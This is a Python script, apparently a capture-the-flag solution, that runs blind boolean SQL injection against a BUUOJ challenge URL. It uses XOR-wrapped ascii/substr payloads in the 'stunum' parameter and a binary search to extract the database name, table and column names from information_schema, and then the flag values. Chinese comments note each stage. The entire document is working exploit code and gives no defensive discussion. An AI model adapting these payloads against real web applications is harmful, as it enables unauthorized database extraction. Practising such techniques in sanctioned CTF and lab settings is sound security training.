import requests

url= 'http://bb5dea4e-b174-4659-991b-8f1057a925fc.node4.buuoj.cn:81/'

database =""

payload1 = "?stunum=1^(ascii(substr((select(database())),{},1))>{})^1" #库名为ctf
payload2 = "?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{},1))>{})^1"#表名为flag,score
payload3 ="?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{})^1" #列名为flag,value
payload4 = "?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))>{})^1" #
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        # payload = payload1.format(i,mid)  #查库名
        # payload = payload2.format(i,mid)  #查表名
        # payload = payload3.format(i,mid)  #查列名
        payload = payload4.format(i,mid) #查flag

        new_url = url + payload
        r = requests.get(new_url)
        print(new_url)
        if "Hi admin, your score is: 100" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) //2
    if (mid == 32 or mid == 132):
        break
    database +=chr(mid)
    print(database)

print(database)
